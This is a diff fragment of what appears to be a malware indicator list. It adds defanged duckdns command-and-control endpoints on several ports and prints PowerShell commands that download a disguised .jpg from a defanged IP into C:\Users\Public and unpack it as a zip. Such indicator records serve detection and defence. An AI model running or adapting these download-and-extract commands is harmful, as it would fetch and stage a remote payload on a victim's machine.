@@ -11,6 +11,10 @@ hxxp://162.244.210[.]92:333/koko.txt
 
 hxxp://162.244.210[.]92:333/kok.jpg 
 
+kareemovic11[.]duckdns[.]org:6606
+kareemovic11[.]duckdns[.]org:7707
+kareemovic11[.]duckdns[.]org:8808
+
 Powershell Commands:
 start-bitstransfer -source "hxxp://162.244.210[.]92:333/kok.jpg" -destination "C:\\Users\\Public\\bbbb.zip"
 Expand-Archive -Path 'C:\Users\Public\bbbb.zip' -DestinationPath 'C:\Users\Public'
